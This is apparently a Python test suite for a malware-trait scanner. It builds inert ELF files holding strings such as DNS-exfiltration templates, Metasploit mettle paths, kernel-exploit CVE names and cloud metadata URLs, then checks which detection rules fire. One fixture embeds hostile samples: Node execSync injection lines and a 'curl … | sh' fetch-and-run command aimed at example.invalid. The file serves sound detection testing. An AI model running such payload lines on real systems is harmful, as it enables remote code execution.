"""Static fixtures: reference text must not become execution or identity."""
import json
import os
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[2]
DNS = "objectives/exfiltration/dns/tunnel::native-dns-exfil-label-template"
TAG = "objectives/command-and-control/dropper/download::lzrd-family-tag"
NAME = "metadata/file/naming::mettle-or-sniffer-bin-path"
OLD_NAME = "well-known/tool/offensive/metasploit::mettle-bin-dir-path"
THIRD_PARTY = "third_party/SigBase/EXPL/SUSP/JS/Exploitation/Payloads/Dec25"
DOC = "metadata/package/documentation/security-advisory::"
RPC = "micro-behaviors/communications/rpc::drsuapi-interface-reference"
AWS = "micro-behaviors/communications/http/services/aws::native-imds-endpoint-reference"
GCP = "micro-behaviors/communications/http/services/gcp::native-metadata-host-and-flavor-header"
ROUTE = "micro-behaviors/communications/http/url/api-path::native-api-command-path"
CURL = "micro-behaviors/communications/http/curl::curl-ping-or-beacon-path"
SETID = "micro-behaviors/process/identity/setuid::setresid-1000-source"
TASK = "objectives/command-and-control/backdoor/rat/tasking::shell-command-tasking-schema"


def elf(text, minimum=0):
    """Build an inert x86-64 ELF with text and a read-only string section."""
    code = b"\xc3"
    payload = text.encode() + b"\0"
    names = b"\0.text\0.rodata\0.shstrtab\0"
    text_off = 120
    data_off = 128
    names_off = data_off + len(payload)
    sections_off = (names_off + len(names) + 7) & ~7
    size = max(sections_off + 4 * 64, minimum)
    buf = bytearray(size)
    buf[:64] = struct.pack(
        "<16sHHIQQQIHHHHHH", b"\x7fELF\x02\x01\x01" + b"\0" * 9,
        2, 62, 1, 0x400000 + text_off, 64, sections_off, 0,
        64, 56, 1, 64, 4, 3,
    )
    struct.pack_into("<IIQQQQQQ", buf, 64, 1, 5, 0, 0x400000,
                     0x400000, size, size, 0x1000)
    buf[text_off:text_off + len(code)] = code
    buf[data_off:data_off + len(payload)] = payload
    buf[names_off:names_off + len(names)] = names
    for index, name, flags, offset, length in [
        (1, 1, 6, text_off, len(code)),
        (2, 7, 2, data_off, len(payload)),
        (3, 15, 0, names_off, len(names)),
    ]:
        struct.pack_into("<IIQQQQIIQQ", buf, sections_off + index * 64,
                         name, 1, flags, 0x400000 + offset, offset, length,
                         0, 0, 1, 0)
    return bytes(buf)


cases = {
    "dns-template": (elf("%s.exfil.%s"), {DNS}, set()),
    "dns-hostname": (elf("example.exfil.example.invalid"), set(), {DNS}),
    "lzrd-tag": (elf("lzrd ready"), {TAG}, set()),
    "encoded-lzrd": (elf("ABCDEFG123lzrdZYX987"), set(), {TAG}),
    "large-lzrd": (elf("lzrd ready", 9000), set(), {TAG}),
    "bin/mettle": (elf("ordinary CLI"), {NAME}, {OLD_NAME}),
    "build/x86_64-linux-musl/bin/mettle.bin": (
        elf("mettlesploit!", 2048), {NAME, "well-known/tool/offensive/metasploit::mettle-payload-banner"},
        {OLD_NAME}),
    "kernel-references": (
        elf("DirtyCow CVE-2016-5195 DirtyPipe CVE-2022-0847"),
        {DOC + x for x in ["dirtycow-reference", "cve-2016-5195-reference",
                           "dirtypipe-reference", "cve-2022-0847-reference"]},
        {"objectives/privilege-escalation/exploit/vulnerabilities/kernel::dirtycow",
         "objectives/privilege-escalation/exploit/vulnerabilities/kernel::dirtypipe"}),
    "kernel-near-miss": (elf("DirtyBird CVE-2016-5196 CVE-2022-0848"), set(),
                         {DOC + "dirtycow-reference", DOC + "dirtypipe-reference",
                          DOC + "cve-2016-5195-reference", DOC + "cve-2022-0847-reference"}),
    "replication-reference": (elf("DRSUAPI"), {RPC},
                              {"objectives/credential-access/dump/system::drsuapi-dump-reference"}),
    "replication-near-miss": (elf("DRSOTHER"), set(), {RPC}),
    "metadata-reference": (elf("http://169.254.169.254/latest/meta-data/\0"
                               "metadata.google.internal Metadata-Flavor"), {AWS, GCP}, set()),
    "metadata-near-miss": (elf("http://169.254.169.254/latest/other/\0"
                               "metadata.google.internal\0ordinary header"), set(), {AWS, GCP}),
    "command-route": (elf("/api/command"), {ROUTE}, set()),
    "command-route-near-miss": (elf("/api/commander"), set(), {ROUTE}),
    "curl-ping": (elf("curl https://example.invalid/ping"), {CURL}, set()),
    "curl-near-miss": (elf("curl https://example.invalid/status"), set(), {CURL}),
    "gid-status": (elf("uid=1000 gid=1000"), set(), {SETID}),
    "setresid": (elf("setresgid(1000,1000,1000)"), {SETID}, set()),
    "runner-name.js": (b'const tools = ["bash_run"];', set(), {TASK}),
    "task-schema.js": (b'const task = {"t":"cmd", "command":"id", "runner":"bash_run"};',
                       {TASK}, set()),
    "embedded-examples": (elf(
        "## EJS\n```javascript\nprocess.mainModule.require('child_process').execSync('id')\n```\n"
        "## Deserialization\n```javascript\nrequire('child_process').execSync('curl http://example.invalid')\n```\n"
        "## Shell examples\n```sh\ncurl https://example.invalid | sh\n```"),
        {THIRD_PARTY}, {DNS, OLD_NAME, TAG}),
}

with tempfile.TemporaryDirectory(prefix="mettle-reference-controls-") as directory:
    temp = Path(directory)
    for name, (data, _, _) in cases.items():
        path = temp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
    result = subprocess.run(
        [os.environ.get("CLEAVE", "cleave"), "--traits-dir", str(ROOT), "--format", "json",
         *[str(temp / name) for name in cases]], capture_output=True, text=True,
    )
    assert result.returncode == 0, result.stderr + result.stdout
    decoder = json.JSONDecoder()
    reports = []
    remaining = result.stdout.lstrip()
    while remaining:
        report, end = decoder.raw_decode(remaining)
        reports.extend(report["files"])
        remaining = remaining[end:].lstrip()
    for name, (_, expected, forbidden) in cases.items():
        findings = [trait for file in reports if file["path"] == str(temp / name)
                    for trait in file.get("traits", [])]
        ids = {trait["id"] for trait in findings}
        assert expected <= ids, (name, "missing", expected - ids)
        assert not forbidden & ids, (name, "unexpected", forbidden & ids)
        if name == "embedded-examples":
            match = next(trait for trait in findings if trait["id"] == THIRD_PARTY)
            assert match["crit"] == 3, match
        print("PASS", name)
